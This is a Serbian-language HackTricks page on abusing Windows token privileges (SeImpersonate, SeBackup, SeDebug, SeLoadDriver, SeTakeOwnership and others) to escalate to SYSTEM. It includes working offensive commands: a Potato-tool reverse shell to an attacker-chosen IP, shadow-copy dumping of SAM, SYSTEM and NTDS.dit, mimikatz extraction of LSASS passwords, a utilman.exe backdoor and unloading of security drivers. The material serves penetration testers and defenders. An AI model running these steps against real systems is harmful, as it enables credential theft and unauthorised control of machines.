# Zloupotreba tokena

{{#include ../../banners/hacktricks-training.md}}

## Tokeni

Ako **ne znate šta su Windows Access Tokens**, pročitajte ovu stranicu pre nego što nastavite:


{{#ref}}
access-tokens.md
{{#endref}}

**Možda ćete moći da eskalirate privilegije zloupotrebom tokena koje već posedujete.**

### SeImpersonatePrivilege

Ova privilegija omogućava procesu da se predstavlja kao drugi korisnik (ali ne i da kreira token) kada može da dođe do handle-a tog tokena. Privilegovani token može da se pribavi od Windows servisa (DCOM) tako što se navede da obavi NTLM autentifikaciju prema exploit-u, što potom omogućava pokretanje procesa sa SYSTEM privilegijama.<sup>[[2]](#references)</sup> Ovaj primitiv može da se iskoristi alatima kao što su [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (za koji je potrebno da WinRM bude onemogućen), [SweetPotato](https://github.com/CCob/SweetPotato) i [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Web aplikacija dostupna samo preko loopback interfejsa može predstavljati zaseban pravac za navođenje na zahtev ako lokalni korisnik može da pristupi autentifikovanom endpoint-u koji šalje zahtev ka URL-u koji bira pozivalac, pod privilegovanijim identitetom. Proverite autorizaciju endpoint-a i ograničenja URL-ova, stvarni identitet izlaznog klijenta i njegovo ponašanje pri autentifikaciji, kao i da li taj klijent može da pristupi listener-u pod kontrolom korisnika sa nižim privilegijama. Samo prisustvo omogućenog `SeImpersonatePrivilege`, IIS listener-a ili parametra za preuzimanje URL-a ne dokazuje postojanje privilegovanog tokena niti putanje za eskalaciju. Ovu proveru obavljajte pasivno; nemojte slati zahteve za navođenje tokom enumeracije. Pogledajte Microsoftovu dokumentaciju o [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) i [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Savremene napomene za operatere:

- **JuicyPotato je zastareo**: na Windows 10 1809+/Server 2019+ sistemima, prednost dajte alatima **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ili **PrintSpoofer**, u zavisnosti od toga koja RPC/COM površina je i dalje dostupna.
- Ako ste kompromitovali servis koji radi kao **`LOCAL SERVICE`** ili **`NETWORK SERVICE`**, a `whoami /priv` prikazuje **filtrirani token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, prvo vratite **podrazumevani skup privilegija** naloga (na primer, pomoću alata **FullPowers**), a zatim ponovo isprobajte Potato alate.<sup>[[3]](#references)</sup>
- Neki noviji fork-ovi su praktičniji za operatere od originalnih alata. Na primer, **SigmaPotato** dodaje reflection/in-memory izvršavanje i kompatibilnost sa savremenim verzijama Windows-a, dok **PrintNotifyPotato** zloupotrebljava PrintNotify COM servis i često je koristan kada je klasična Spooler putanja onemogućena.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Veoma je sličan privilegiji **SeImpersonatePrivilege**; koristiće **istu metodu** za dobijanje privilegovanog tokena.\
Ova privilegija zatim omogućava **dodelu primarnog tokena** novom ili suspendovanom procesu. Pomoću privilegovanog tokena za impersonaciju možete da izvedete primarni token (DuplicateTokenEx).\
Pomoću tog tokena možete da kreirate **novi proces** koristeći 'CreateProcessAsUser' ili da kreirate suspendovan proces i **postavite token** (generalno, ne možete da izmenite primarni token pokrenutog procesa).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Ako je ovaj token omogućen, možete da koristite **KERB_S4U_LOGON** da biste dobili **token za impersonaciju** bilo kog drugog korisnika bez poznavanja njegovih akreditiva, da **dodate proizvoljnu grupu** (admins) u token, podesite **nivo integriteta** tokena na "**medium**" i dodelite taj token **trenutnoj niti** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Ova privilegija navodi sistem da **odobri pristup za čitanje** bilo kojoj datoteci (ograničeno na operacije čitanja). Koristi se za **čitanje password hash-eva lokalnih Administrator naloga** iz registra, nakon čega se alati poput "**psexec**" ili "**wmiexec**" mogu koristiti sa hash-om (tehnika Pass-the-Hash). Međutim, ova tehnika ne funkcioniše u dva slučaja: kada je lokalni Administrator nalog onemogućen ili kada postoji politika koja uklanja administratorska prava lokalnim Administratorima koji se povezuju na daljinu.<sup>[[2]](#references)</sup>\
U praksi je najpouzdaniji ugrađeni postupak obično **VSS + `robocopy /b`**: kreirajte/izložite shadow copy, pa kopirajte `SAM`/`SYSTEM` ili `NTDS.dit` u **backup mode**, čime se zaobilaze ACL-ovi datoteka.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Možete **zloupotrebiti ovu privilegiju** pomoću:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- praćenjem **IppSec** na [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ili, kao što je objašnjeno u odeljku **eskalacija privilegija pomoću Backup Operators** u:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ova privilegija omogućava **pristup za pisanje** bilo kojoj sistemskoj datoteci, bez obzira na njenu Access Control List (ACL). Pruža brojne mogućnosti za eskalaciju privilegija, uključujući mogućnost **izmene servisa**, izvođenja DLL Hijacking napada i postavljanja **debuggera** putem opcije Image File Execution Options, kao i razne druge tehnike.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege je moćna dozvola, naročito korisna kada korisnik može da se lažno predstavlja pomoću tokena, ali i kada nema SeImpersonatePrivilege. Ova mogućnost zavisi od sposobnosti lažnog predstavljanja tokena koji predstavlja istog korisnika i čiji nivo integriteta nije viši od nivoa integriteta trenutnog procesa.<sup>[[2]](#references)</sup>

**Ključne tačke:**

- **Lažno predstavljanje bez SeImpersonatePrivilege:** SeCreateTokenPrivilege se može iskoristiti za EoP lažnim predstavljanjem tokena pod određenim uslovima.
- **Uslovi za lažno predstavljanje tokena:** Uspešno lažno predstavljanje zahteva da ciljni token pripada istom korisniku i da ima nivo integriteta koji je manji od ili jednak nivou integriteta procesa koji pokušava lažno predstavljanje.
- **Kreiranje i izmena tokena za lažno predstavljanje:** Korisnici mogu da kreiraju token za lažno predstavljanje i da ga unaprede dodavanjem SID-a privilegovane grupe (Security Identifier).

### SeLoadDriverPrivilege

Ova privilegija omogućava procesu da **učitava i uklanja drajvere uređaja** kreiranjem stavke u registru sa određenim vrednostima `ImagePath` i `Type`. Pošto je direktan pristup za pisanje u `HKLM` (HKEY_LOCAL_MACHINE) ograničen, umesto njega može da se koristi `HKCU` (HKEY_CURRENT_USER). Međutim, potreban je određeni put kako bi kernel prepoznao stavku `HKCU` kao konfiguraciju drajvera.<sup>[[2]](#references)</sup>

Savremena ofanzivna upotreba obično podrazumeva **BYOVD** (bring your own vulnerable driver): učitavanje **potpisanog, ali ranjivog** kernel drajvera, a zatim korišćenje njegovih IOCTL-ova za onemogućavanje zaštita ili izvršavanje koda u kernelu. Imajte na umu da na novijim verzijama Windows 11/Server sistema **Microsoft vulnerable driver blocklist** i/ili **HVCI/Memory Integrity** često onemogućavaju starije javno poznate tehnike, pa klasični primeri u stilu `szkg64.sys` više nisu pouzdani u svim slučajevima.

Putanja je `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gde je `<RID>` Relative Identifier trenutnog korisnika. Unutar `HKCU` mora da se kreira cela ova putanja, a zatim da se podese dve vrednosti:<sup>[[2]](#references)</sup>

- `ImagePath`, putanja do binarne datoteke koja će se izvršiti
- `Type`, sa vrednošću `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Koraci:**

1. Koristite `HKCU` umesto `HKLM` zbog ograničenog pristupa za pisanje.
2. Kreirajte putanju `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` unutar `HKCU`, gde `<RID>` označava Relative Identifier trenutnog korisnika.
3. Podesite `ImagePath` na putanju do binarne datoteke koja će se izvršiti.
4. Podesite `Type` na `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Više načina za zloupotrebu ove privilegije: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Ova privilegija je slična privilegiji **SeRestorePrivilege**. Njena primarna funkcija omogućava procesu da **preuzme vlasništvo nad objektom**, zaobilazeći zahtev za eksplicitnim diskrecionim pristupom tako što mu dodeljuje WRITE_OWNER prava pristupa. Postupak obuhvata prvo preuzimanje vlasništva nad željenim registry ključem radi pisanja, a zatim izmenu DACL-a kako bi se omogućile operacije upisivanja.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Ova privilegija omogućava **debugovanje drugih procesa**, uključujući čitanje i upisivanje u memoriju. Uz ovu privilegiju mogu se primeniti različite strategije za ubrizgavanje u memoriju, koje mogu da izbegnu većinu antivirusnih rešenja i sistema za sprečavanje upada na hostu.<sup>[[2]](#references)</sup>

Na modernim verzijama Windowsa, imajte na umu da je `SeDebugPrivilege` obično dovoljna za otvaranje **nezaštićenih SYSTEM procesa** i dupliranje njihovih tokena, ali **ne** garantuje da možete pristupiti procesu **LSASS**. Ako je omogućena **RunAsPPL / LSA Protection**, nezaštićeni procesi ne mogu da čitaju iz procesa LSASS niti da ubacuju kod u njega, čak i ako je prisutan `SeDebugPrivilege`. U tom slučaju, ukradite token iz nekog drugog SYSTEM procesa koji nije zaštićen PPL-om ili upotrebite PPL bypass/BYOVD umesto da pretpostavite da će `procdump` raditi. Za primer kompletnog kopiranja tokena pomoću `SeDebugPrivilege` + `SeImpersonatePrivilege`, pogledajte [ovu stranicu](sedebug-+-seimpersonate-copy-token.md).

#### Dump memorije

Možete da upotrebite [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) iz paketa [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) da biste **uhvatili sadržaj memorije procesa**. To se posebno može primeniti na proces **Servisa podsistema lokalnog bezbednosnog autoriteta (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, koji je zadužen za čuvanje korisničkih akreditiva nakon što se korisnik uspešno prijavi na sistem.

Zatim možete da učitate ovaj dump u mimikatz da biste dobili lozinke:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Ranije sačuvan, čitljiv LSASS dump možda je dostupan čak i ako trenutni nalog nema dozvolu za pravljenje dump-a aktivnog zaštićenog procesa. Tretirajte dump fajl ili arhivu sa sličnim nazivom samo kao trag: proverite pristup i sadržaj, a zatim procenite da li su pronađeni kredencijali i dalje važeći i omogućavaju pristup kontekstu sa višim privilegijama. Sam naziv fajla ne dokazuje da arhiva sadrži dump niti da se kredencijali mogu ponovo koristiti.

#### RCE

Ako želite da dobijete `NT SYSTEM` shell, možete koristiti:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Ovo pravo (obavljanje zadataka održavanja volumena) može omogućiti privilegovane operacije nad volumenom, ali samo po sebi ne garantuje pristup čitljivom raw-volume handle-u niti proizvoljan pristup datotekama. ACL-ovi uređaja, stanje tokena, verzija Windows-a i tražena operacija i dalje su važni. Dozvoljena operacija upravljanja volumenom može umesto toga promeniti ACL-ove sistema datoteka; to je izmena koja može uticati na ceo volumen. Na CA host-u, zloupotreba sertifikata takođe zahteva pristup upotrebljivom materijalu privatnog ključa, a datoteke zaštićene pomoću EFS-a i dalje zahtevaju ovlašćeni ključ za dešifrovanje ili oporavak. Detaljni preduslovi navedeni su ispod.<sup>[[5]](#references)</sup>

Pogledajte detaljne tehnike i mere ublažavanja:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Provera privilegija

```
whoami /priv
```

**Tokeni koji se prikazuju kao Disabled** obično se mogu omogućiti, tako da često možete zloupotrebiti i privilegije _Enabled_ i _Disabled_.

### Omogućavanje svih tokena

Ako imate onemogućene privilegije, možete koristiti skriptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) da omogućite sve tokene:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Ili **script** ugrađen u ovaj [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabela

Kompletan cheatsheet za privilegije tokena nalazi se na [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); sažetak u nastavku navodi samo direktne načine za iskorišćavanje privilegije radi dobijanja admin sesije ili čitanja osetljivih fajlova.<sup>[[1]](#references)</sup>

| Privilegija                | Uticaj      | Alat                    | Putanja izvršavanja                                                                                                                                                                                                                                                                                                                                     | Napomene                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | alat treće strane       | _"Omogućava korisniku da se lažno predstavlja kao drugi token i podigne privilegije do nt system pomoću alata kao što su potato.exe, rottenpotato.exe i juicypotato.exe"_                                                                                                                                                                                                      | Hvala [Aurélien Chalot](https://twitter.com/Defte_) na ažuriranju. Uskoro ću pokušati da ovo preformulišem u obliku recepta.                                                                                                                                                                                         |
| **`SeBackup`**             | **Pretnja** | _**Ugrađene komande**_ | Čitajte osetljive fajlove pomoću `robocopy /b` ili namenskih pomoćnih alata za kopiranje koji podržavaju SeBackup.                                                                                                                                                                                                                                                                 | <p>- Korisno za `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, a ponekad i `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` je praktičan, ali namenski SeBackup cmdlets/API-ji često nude veću fleksibilnost za zaključane/otvorene fajlove.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | alat treće strane       | Kreirajte proizvoljan token, uključujući lokalna admin prava, pomoću `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplirajte SYSTEM token koji nije **PPL** ili izbacite memoriju iz procesa koji nije zaštićen.                                                                                                                                                                                                                                                                 | <p>Izbacivanje LSASS memorije obično je blokirano ako je RunAsPPL/LSA Protection omogućen.</p><p>Script možete pronaći na [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | alat treće strane       | Koristite **Potato family** / lažno predstavljanje pomoću named pipe-a za pokretanje procesa kao SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` itd.).                                                                                                                                                                                    | <p>Najpraktičnije je koristiti ovo iz servisnih naloga kao što su IIS APPPOOL, MSSQL, zakazani zadaci ili bilo kog konteksta koji već ima `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | alat treće strane       | <p>1. Učitajte potpisani, ali ranjivi kernel driver (BYOVD)<br>2. Koristite IOCTL-ove drivera za kernel R/W, isključivanje bezbednosnih alata ili podizanje privilegija do SYSTEM<br><br>Druga mogućnost je korišćenje ove privilegije za uklanjanje bezbednosnih drivera pomoću ugrađene komande <code>fltMC</code>, npr. <code>fltMC sysmondrv</code></p>                     | <p>Stariji javno dostupni driveri kao što je <code>szkg64.sys</code> sve češće su blokirani na novijem Windowsu pomoću liste blokiranih ranjivih drivera / HVCI-ja.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Pokrenite PowerShell/ISE sa prisutnom privilegijom SeRestore.<br>2. Omogućite privilegiju pomoću <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Preimenujte utilman.exe u utilman.old<br>4. Preimenujte cmd.exe u utilman.exe<br>5. Zaključajte konzolu i pritisnite Win+U</p> | <p>Neki AV softveri mogu da otkriju napad.</p><p>Alternativna metoda se oslanja na zamenu service binarnih fajlova smeštenih u „Program Files“ pomoću iste privilegije.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Ugrađene komande**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Preimenujte cmd.exe u utilman.exe<br>4. Zaključajte konzolu i pritisnite Win+U</p>                                                                                                                                       | <p>Neki AV softveri mogu da otkriju napad.</p><p>Alternativna metoda se oslanja na zamenu service binarnih fajlova smeštenih u „Program Files“ pomoću iste privilegije.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | alat treće strane       | <p>Manipulišite tokenima tako da obuhvataju lokalna admin prava. Možda je potrebna SeImpersonate.</p><p>Potrebna provera.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - putanje iskorišćavanja od Windows privilegija do admin prava](https://github.com/gtworek/Priv2Admin)
- [2] [Zloupotreba privilegija tokena za LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Vratite mi moje privilegije! Molim vas?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` režim pravljenja rezervne kopije zaobilazi ACL provere fajlova/foldera)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Obavljanje zadataka održavanja volumena (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → eksfiltracija CA ključa → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
